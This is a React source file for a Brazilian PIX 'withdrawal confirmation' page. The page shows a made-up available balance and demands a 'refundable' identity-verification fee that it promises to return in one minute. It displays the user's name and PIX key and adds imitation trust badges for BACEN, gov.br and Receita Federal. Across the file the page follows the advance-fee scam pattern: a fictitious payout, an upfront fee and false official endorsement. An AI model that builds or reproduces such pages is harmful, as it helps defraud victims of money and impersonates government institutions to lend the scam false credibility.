import { useLocation, useNavigate } from "react-router-dom";
import { ArrowLeft, Clock, Check } from "lucide-react";
import coinIcon from "@/assets/coin-icon.png";

const Confirmation = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const { nome, pixKeyType, pixKey, amount } = location.state || {};

  const balance = amount || "2.834,72";
  const taxaReembolso = "32,67";
  const currentDate = new Date().toLocaleDateString("pt-BR");

  const formatPixKey = () => {
    if (pixKeyType === "cpf" && pixKey) {
      // Format CPF for display
      const cleaned = pixKey.replace(/\D/g, "");
      return `${cleaned.slice(0, 3)}.${cleaned.slice(3, 6)}.${cleaned.slice(6, 9)}-${cleaned.slice(9, 11)}`;
    }
    return pixKey || "";
  };

  const getPixKeyTypeLabel = () => {
    const types: Record<string, string> = {
      cpf: "CPF",
      phone: "Celular",
      email: "E-mail",
      random: "Chave aleatória"
    };
    return types[pixKeyType] || "PIX";
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Dark Header */}
      <header className="bg-foreground text-primary-foreground py-4 px-4">
        <div className="max-w-md mx-auto">
          <div className="flex items-center gap-3">
            <button onClick={() => navigate("/sacar")} className="p-1">
              <ArrowLeft className="w-5 h-5" />
            </button>
            <h1 className="text-lg font-semibold flex-1 text-center pr-6">
              Confirmação
            </h1>
          </div>
        </div>
      </header>

      <div className="max-w-md mx-auto px-4 py-4">
        {/* Balance Card */}
        <div className="bg-gradient-to-r from-success to-emerald-500 rounded-xl p-5 text-success-foreground mb-4">
          <div className="flex items-center justify-between">
            <div>
              <p className="text-sm opacity-90 mb-1">SALDO DISPONÍVEL</p>
              <p className="text-3xl font-bold">R$ {balance}</p>
              <p className="text-sm opacity-80 mt-2">Aguardando confirmação para saque</p>
            </div>
            <img src={coinIcon} alt="Coin" className="w-16 h-16" />
          </div>
        </div>

        {/* Confirmação de Identidade */}
        <div className="bg-card rounded-xl p-5 shadow-md mb-4">
          <p className="text-xs text-muted-foreground mb-2">CONFIRMAÇÃO DE IDENTIDADE</p>
          <div className="flex items-center gap-3">
            <span className="text-2xl font-bold text-destructive">R$ {taxaReembolso}</span>
            <span className="bg-secondary text-secondary-foreground text-xs px-3 py-1 rounded-full font-medium">
              VALOR REEMBOLSÁVEL
            </span>
          </div>
          <p className="text-sm text-muted-foreground mt-3">
            Taxa obrigatória para liberação do saque no valor de{" "}
            <span className="text-foreground font-semibold">R$ {balance}</span>. O valor de{" "}
            <span className="text-foreground font-semibold">R$ {taxaReembolso}</span> será reembolsado
            integralmente para você em 1 minuto.
          </p>
        </div>

        {/* Dados para Reembolso */}
        <div className="bg-card rounded-xl p-5 shadow-md mb-4">
          <p className="text-xs text-muted-foreground mb-4">DADOS PARA REEMBOLSO</p>
          
          <div className="space-y-3">
            <div className="flex justify-between items-center py-2 border-b border-border">
              <span className="text-muted-foreground">Nome</span>
              <span className="text-foreground font-medium">{nome || "Usuário"}</span>
            </div>
            <div className="flex justify-between items-center py-2 border-b border-border">
              <span className="text-muted-foreground">Dados</span>
              <span className="text-foreground font-medium">{currentDate}</span>
            </div>
            <div className="flex justify-between items-center py-2 border-b border-border">
              <span className="text-muted-foreground">Chave PIX</span>
              <span className="text-foreground font-medium">{getPixKeyTypeLabel()}</span>
            </div>
            <div className="flex justify-between items-center py-2 border-b border-border">
              <span className="text-muted-foreground">Valor a receber</span>
              <span className="text-foreground font-semibold">R$ {balance}</span>
            </div>
          </div>

          {/* PIX Key Display */}
          <div className="mt-4 bg-secondary/50 rounded-lg py-3 px-4 text-center">
            <span className="text-muted-foreground font-mono">{formatPixKey()}</span>
          </div>
        </div>

        {/* Processo de Liberação */}
        <div className="bg-card rounded-xl p-5 shadow-md mb-4">
          <p className="text-xs text-muted-foreground mb-4">PROCESSO DE LIBERAÇÃO</p>
          
          <div className="space-y-4">
            {/* Step 1 */}
            <div className="flex items-start gap-3">
              <div className="w-6 h-6 rounded-full bg-primary text-primary-foreground flex items-center justify-center text-sm font-semibold">
                1
              </div>
              <div>
                <p className="font-semibold text-foreground">Pagar taxa de confirmação</p>
                <p className="text-sm text-muted-foreground">R$ {taxaReembolso} para verificação de identidade</p>
              </div>
            </div>

            {/* Step 2 */}
            <div className="flex items-start gap-3">
              <div className="w-6 h-6 rounded-full bg-success text-success-foreground flex items-center justify-center">
                <Check className="w-4 h-4" />
              </div>
              <div>
                <p className="font-semibold text-foreground">reembolso</p>
                <p className="text-sm text-muted-foreground">Valor em 1 minuto</p>
              </div>
            </div>

            {/* Step 3 */}
            <div className="flex items-start gap-3">
              <div className="w-6 h-6 rounded-full bg-muted text-muted-foreground flex items-center justify-center text-sm font-semibold">
                3
              </div>
              <div>
                <p className="font-semibold text-foreground">Acessar saldo completo</p>
                <p className="text-sm text-muted-foreground">R$ {balance} liberado para saque</p>
              </div>
            </div>
          </div>
        </div>

        {/* Pay Button */}
        <button
          onClick={() => {
            // Handle payment action
            console.log("Pagar taxa para liberar saque");
          }}
          className="w-full bg-destructive text-destructive-foreground py-4 rounded-xl font-semibold text-lg transition-all hover:bg-destructive/90 mb-3"
        >
          Pagar taxa para Liberar Saque
        </button>

        {/* Reembolso Info */}
        <div className="flex items-center justify-center gap-2 text-muted-foreground mb-6">
          <Clock className="w-4 h-4" />
          <span className="text-sm">Reembolso automático em 1 minuto</span>
        </div>

        {/* Trust Badges */}
        <div className="flex items-center justify-center gap-6 pb-6">
          {/* BACEN */}
          <div className="flex flex-col items-center">
            <svg viewBox="0 0 40 40" className="w-10 h-10 text-[#32BCAD]">
              <rect x="5" y="5" width="30" height="30" rx="4" fill="currentColor" opacity="0.1"/>
              <text x="20" y="28" textAnchor="middle" fill="currentColor" fontSize="10" fontWeight="bold">BC</text>
            </svg>
            <span className="text-xs text-muted-foreground mt-1">BACEN</span>
          </div>
          
          {/* gov.br */}
          <div className="flex flex-col items-center">
            <div className="text-[#1351B4] font-bold text-lg">gov.br</div>
          </div>
          
          {/* Receita Federal */}
          <div className="flex flex-col items-center">
            <svg viewBox="0 0 40 40" className="w-10 h-10 text-destructive">
              <path d="M20 5 L35 15 L35 30 L20 35 L5 30 L5 15 Z" fill="currentColor" opacity="0.1"/>
              <path d="M20 10 L30 17 L30 27 L20 32 L10 27 L10 17 Z" stroke="currentColor" fill="none" strokeWidth="1.5"/>
            </svg>
            <span className="text-xs text-muted-foreground mt-1">Receita Federal</span>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Confirmation;
